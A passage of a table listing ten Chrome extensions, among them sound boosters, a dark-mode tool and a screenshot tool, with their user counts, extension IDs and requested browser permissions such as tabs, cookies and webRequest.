| Super Mario Bros Game | 163,597 | pegfdldddiilihjahcpdehhhfcbibipg | All websites<br>declarativeNetRequest |
| Custom Cursor for Chrome | 785,639 | phfkifnjcmdcmljnnablahicoabkokbg | All websites<br>tabs |
| Text mode for websites - Readbee | 451,865 | phjbepamfhjgjdgmbhmfflhnlohldchb | All websites |
| Dark Mode - Dark Reader for Сhrome | 4,557,935 | pjbgfifennfhnbkhoidkdchbflppjncb | All websites<br>tabs<br>webRequest |
| Sound Booster - Boost My Bass | 124,554 | plmlopfeeobajiecodiggabcihohcnge | All websites<br>tabCapture<br>tabs |
| Sound Booster | 144,170 | pmilcmjbofinpnbnpanpdadijibcgifc | All websites<br>tabCapture<br>tabs |
| Screen Capture - Screenshot Tool | 748,022 | pmnphobdokkajkpbkajlaiooipfcpgio | All websites<br>downloads<br>tabs<br>unsafe-eval |
| Picture-in-Picture - floating video | 706,151 | pnanegnllonoiklmmlegcaajoicfifcm | All websites<br>tabs<br>unsafe-eval |
| Save quickly and repost | 918,667 | pnlphjjfielecalmmjjdhjjninkbjdod | All websites<br>cookies<br>downloads<br>tabs<br>webRequest |
| History & Cache Cleaner - Smart Clean | 277,722 | pooaemmkohlphkekccfajnbcokjlbehk | All websites<br>cookies<br>tabs<br>webRequest |